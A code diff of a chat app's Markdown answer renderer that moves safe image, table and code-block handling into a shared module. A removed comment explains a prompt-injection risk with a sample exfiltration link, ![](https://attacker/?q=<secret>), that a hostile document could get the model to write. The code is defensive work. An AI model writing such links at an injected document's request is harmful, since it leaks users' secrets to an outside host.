@@ -1,42 +1,18 @@
 import ReactMarkdown, { type Components } from "react-markdown"
 import remarkGfm from "remark-gfm"
-import type { Element, ElementContent } from "hast"
 
 import "@/components/chat-motion.css"
 import { CitationChip } from "@/components/citations"
-import { CodeBlock, CodeBlockContent } from "@/components/ui/code-block"
-import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
+import { MARKDOWN_BLOCKS } from "@/lib/markdown-blocks"
 import { citedNumber, remarkCitations } from "@/lib/citations"
 import { rehypeStreaming } from "@/lib/rehype-streaming"
 import { cn } from "@/lib/utils"
 
-const textOf = (node: Element | ElementContent): string =>
-  node.type === "text" ? node.value : node.type === "element" ? node.children.map(textOf).join("") : ""
-
-// Answers never load images or render raw HTML: a document could tell the model to
-// write ![](https://attacker/?q=<secret>), and the browser would send it on its own.
-// An image shows as its alt text instead, and HTML in the text is dropped (skipHtml).
-// A [S#] marker (made a "#cite-#" link by remarkCitations) is a citation chip.
-// Tables (e.g. rows quoted from an attached spreadsheet, C24) as the app's own
-// tables: wide ones scroll sideways inside the answer, not the page. Fenced code as
-// a plain Code Block (no highlighter: it would bring shiki).
+// Answers render a document's blocks safely (lib/markdown-blocks.tsx: no images, no raw
+// HTML, the app's own tables and code blocks). A [S#] marker (made a "#cite-#" link
+// by remarkCitations) is a citation chip.
 const ANSWER_MARKDOWN: Components = {
-  img: ({ alt }) => (alt ? <span className="text-muted-foreground">[{alt}]</span> : null),
-  table: ({ children }) => (
-    <div className="my-3 rounded-lg border border-border/70 font-sans text-sm leading-normal">
-      <Table>{children}</Table>
-    </div>
-  ),
-  thead: ({ children }) => <TableHeader className="bg-muted/50">{children}</TableHeader>,
-  tbody: ({ children }) => <TableBody>{children}</TableBody>,
-  tr: ({ children }) => <TableRow>{children}</TableRow>,
-  th: ({ children }) => <TableHead className="h-8 px-3">{children}</TableHead>,
-  td: ({ children }) => <TableCell className="px-3 py-1.5 whitespace-normal">{children}</TableCell>,
-  pre: ({ node }) => (
-    <CodeBlock size="sm" className="my-3">
-      <CodeBlockContent>{node ? textOf(node).replace(/\n$/, "") : null}</CodeBlockContent>
-    </CodeBlock>
-  ),
+  ...MARKDOWN_BLOCKS,
   a: ({ href, title, children }) => {
     const n = citedNumber(href)
     return n ? (
